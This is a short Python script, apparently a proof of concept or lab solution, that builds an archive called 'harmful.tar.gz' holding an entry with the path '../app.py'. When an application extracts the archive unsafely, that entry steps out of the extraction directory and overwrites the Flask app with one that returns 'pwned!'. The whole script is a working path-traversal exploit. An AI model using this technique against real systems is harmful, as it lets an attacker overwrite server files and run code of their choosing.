import tarfile, io
import time

new_app = '''
from flask import Flask
app = Flask(__name__)
@app.route("/")
def root():
    return "<p1>pwned!</p1>"
'''

tar = tarfile.open('harmful.tar.gz', mode='w:gz')
info = tarfile.TarInfo('../app.py')
info.mtime = time.time()
info.size = len(new_app)
tar.addfile(info, io.BytesIO(new_app.encode()))
tar.close()
